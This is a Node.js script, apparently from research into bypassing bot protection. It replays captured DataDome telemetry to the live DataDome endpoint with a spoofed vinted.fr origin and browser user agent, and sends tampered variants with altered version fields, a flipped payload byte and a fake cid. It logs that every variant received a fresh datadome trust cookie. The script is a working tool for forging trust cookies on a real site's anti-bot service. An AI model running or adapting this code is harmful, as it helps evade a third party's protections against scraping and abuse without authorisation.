#!/usr/bin/env node
/** dd-tamper.mjs — replay/tamper/ship the DataDome tags telemetry LIVE.
 *  Reads the captured POST body from artifacts/cap-result.json, then sends
 *  (a) original, (b) tampered ddv/jsType, (c) flipped-byte jspl, (d) fake cid
 *  to api-js.datadome.co/js/ and prints status + issued datadome cookie.
 *  Result (observed): ALL variants -> 200 + fresh datadome cookie (the tags
 *  endpoint is a promiscuous trust endpoint; trust value is decided server-side). */
import { readFileSync } from 'node:fs';

const req = readFileSync(new URL('../artifacts/cap-result.json', import.meta.url), 'utf8');
const flow = JSON.parse(req);
const post = flow.reqs.find(r => r.t === 'REQ' && r.m === 'POST');
if (!post) { console.error('no POST body in cap-result.json'); process.exit(1); }
const body = post.body;

async function send(label, b) {
  const r = await fetch('https://api-js.datadome.co/js/', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0 Safari/537.36',
      Origin: 'https://www.vinted.fr',
    },
    body: b,
  });
  const t = await r.text();
  const sc = r.headers.get('set-cookie') || '';
  console.log(`[${label}] HTTP ${r.status}  cookie=${sc.slice(0, 40) || '(none)'}  body=${t.slice(0, 60)}`);
  return { label, status: r.status, cookie: sc.slice(0, 40), body: t.slice(0, 60) };
}

function flipJspl(body) {
  const q = new URLSearchParams(body);
  const jspl = q.get('jspl');
  const buf = Buffer.from(jspl, 'base64url');
  buf[100] ^= 0xff;
  q.set('jspl', buf.toString('base64url'));
  return q.toString();
}

console.log('=== DATADOME tags telemetry: tamper/ship (live) ===\n');
const results = [];
results.push(await send('replay-original      ', body));
results.push(await send('tamper(ddv,jsType)  ', body.replace('ddv=5.11.2', 'ddv=1.0.0').replace('jsType=ch', 'jsType=xx')));
results.push(await send('tamper(jspl byte)   ', flipJspl(body)));
const q = new URLSearchParams(body); q.set('cid', 'fake_datadome_cookie_value');
results.push(await send('fake cid (cookie)   ', q.toString()));

console.log('\nall-200:', results.every(r => r.status === 200));
